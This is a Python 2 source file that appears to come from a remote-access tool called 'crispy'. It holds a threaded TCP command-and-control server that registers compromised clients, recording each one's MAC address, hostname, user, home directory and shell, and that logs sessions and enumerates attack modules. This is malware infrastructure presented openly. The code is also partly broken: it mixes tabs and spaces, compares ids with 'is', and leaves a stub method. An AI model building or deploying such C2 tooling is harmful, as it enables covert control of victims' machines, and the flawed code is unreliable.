import crispy.modules
import logging
import SocketServer

logger = logging.getLogger(__name__)

from pkgutil import iter_modules
from . client import CrispyClient
from .. network.handler import ThreadedTCPRequestHandler

class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
    """ Backend server methods for clients. """

    def __init__(self, server_address, handler_class=ThreadedTCPRequestHandler):
        self.allow_reuse_address = True
        self.clients = []
        self.current_id = 1
        SocketServer.TCPServer.__init__(self, server_address, handler_class)

    def add_client(self, conn, l):
        """ Add new client to client list. """
	logger.debug("add_session() was called")
	cc = CrispyClient({"conn":conn, "id":self.current_id, "ip":conn.client_address[0], "macaddr":l[0], "hostname":l[1], "plat":l[2], 
		"proc_type":l[3], "proc_arch":l[4], "uptime":l[5], "date":l[6], "user":l[7], "home":l[8], "shell":l[9]})
	logger.info("Session {} opened ({}:{} <- {}:{})".format(self.current_id, self.server_address[0], self.server_address[1], conn.client_address[0], conn.client_address[1]))
	self.clients.append(cc)
	self.current_id += 1

    def remove_client(self, conn):
        """ Remove client from client list. """
	logger.debug("remove_client() was called")
	for client in self.clients:
	    if client.get_session() is conn:
                self.clients.remove(client)
	        self.current_id -= 1

    def remove_client_id(self, id): 
    	""" Remove client given an id from client list. """
	logger.debug("remove_client_id() was called")
	for client in self.clients:
	    if client.get_id() is id:
		self.clients.remove(client)
		self.current_id -= 1

    def get_clients(self):
        """ Return a list of clients connected to the C2 server. """
	logger.debug("get_clients() was called")
        return self.clients

    def iter_modules(self):
	""" Iterate over all modules. """
	mods = []
	for module_loader, module_name, ispkg in iter_modules(crispy.modules.__path__):
	    mods.append(module_name)
	    #logger.debug(self.get_module(module_name))
	return sorted(mods)

    def get_module(self, name):
	""" Return a module by name. """
#	for module_loader, module_name, ispkg in iter_modules(crispy.modules.__path__):
#	    if module_name.startswith("lib"):
#		continue
#	    if module_name == name:
#		module = module_loader.find_module(module_name).load_module(module_name)
#		logger.debug(module)
	pass
